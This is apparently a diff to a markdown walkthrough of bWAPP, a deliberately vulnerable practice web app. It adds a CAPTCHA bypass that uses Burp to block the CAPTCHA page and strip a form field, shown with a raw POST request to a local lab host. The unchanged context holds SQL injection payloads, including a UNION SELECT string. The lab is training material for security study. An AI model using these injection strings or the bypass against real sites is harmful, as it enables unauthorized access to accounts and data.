@@ -104,7 +104,29 @@ ok' or 1=1--
 a%' UNION ALL SELECT 1,sqlite_version(),1,1,1,1; --
 ```
 
+# A2 - Broken Authentication
 
+### Broken Auth. - CAPTCHA Bypassing
+
+Using Burp, do not allow the webpage to load captcha_box.php, this page loads the server's session variable $_SESSION["captcha"] which will then require a check on ba_captcha_bypass.php
+The second requirement is to prevent captcha_user from being submitted by the client.  Eliminate this using Burp:
+
+
+```
+POST /bWAPP/ba_captcha_bypass.php HTTP/1.1
+Host: bepp:8088
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://bepp:8088/bWAPP/ba_captcha_bypass.php
+Cookie: PHPSESSID=67a6abb1d7ff40c55ad50d3aa43fc7c4; security_level=0
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+login=bee&password=bug&form=submit
+```
 
 # A6 - Sensitive Data Exposure 
 
